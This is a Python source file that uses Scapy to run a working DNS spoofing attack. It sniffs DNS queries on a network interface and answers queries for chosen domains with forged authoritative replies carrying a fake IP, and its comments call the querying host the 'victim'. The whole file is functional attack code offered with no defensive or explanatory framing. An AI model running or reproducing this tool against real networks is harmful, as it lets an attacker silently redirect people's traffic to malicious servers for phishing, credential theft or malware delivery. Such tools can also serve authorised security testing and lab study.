from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
import os


def spoof_dns_packet(pkt, domain_ip_map, iface):
    # Check if the packet is a DNS query (not a response) and uses UDP
    if pkt.haslayer(DNSQR) and pkt.haslayer(UDP) and pkt[DNS].qr == 0:
        try:
            # Extract the queried domain from the DNS packet
            queried_domain = pkt[DNSQR].qname.decode().strip(".").lower()

            # Ignore domains that are not in our spoofing list
            if queried_domain not in domain_ip_map:
                print("[-] Ignored domain: {}".format(queried_domain))
                return

            # Look up the fake IP to respond with
            fake_ip = domain_ip_map[queried_domain]
            victim_ip = pkt[IP].src
            victim_port = pkt[UDP].sport
            dns_id = pkt[DNS].id

            print("\n[>] Intercepted DNS query from {} for {}".format(victim_ip, queried_domain))

            # Build the spoofed response packet
            ip_layer = IP(src=pkt[IP].dst, dst=victim_ip)
            udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)

            # Create the DNS answer with the fake IP
            dns_answer = DNSRR(
                rrname=pkt[DNSQR].qname,    # The domain we are answering for
                type="A",   # Resource Record type A (IPv4 address)
                rclass="IN",    # Internet class
                ttl=300,    # Time to live for the DNS record
                rdata=fake_ip   # The fake IP address to return
            )

            dns_layer = DNS(
                id=dns_id,  # Use the same ID as the request
                qr=1,   # Set the response flag
                aa=1,   # Authoritative answer
                rd=pkt[DNS].rd, # Recursion Desired flag
                ra=1,   # Recursion Available flag
                qd=pkt[DNS].qd, # Copy the original query
                an=dns_answer,  # Add the answer section with our fake IP
                ancount=1   # Number of answers in the response
            )

            # Combine all layers into the final spoofed response packet
            spoofed_response = ip_layer / udp_layer / dns_layer

            # Force Scapy to recalculate checksums and lengths
            del spoofed_response[IP].len
            del spoofed_response[IP].chksum
            del spoofed_response[UDP].len
            del spoofed_response[UDP].chksum

            # Send the fake response to the victim
            send(spoofed_response, iface=iface, verbose=0)
            print("[+] Sent spoofed DNS response with {} to {}".format(fake_ip, victim_ip))

        except Exception as e:
            print("[!] Error processing DNS packet: {}".format(e))

def start_dns_spoofer(domain_ip_map, iface):
    print("[*] DNS spoofing started")
    print("[*] Listening on interface: {}".format(iface))
    print("[*] Spoofing targets:")
    for domain, ip in domain_ip_map.items():
        print("  - {} -> {}".format(domain, ip))


    conf.iface = iface

    try:
        # Start sniffing DNS queries
        sniff(
            iface=iface,
            filter="udp port 53",
            prn=lambda pkt: spoof_dns_packet(pkt, domain_ip_map, iface),
            store=False
        )
    except KeyboardInterrupt:
        print("\n[!] DNS spoofing stopped.")
    except Exception as e:
        print("[!] Error during sniffing: {}".format(e))
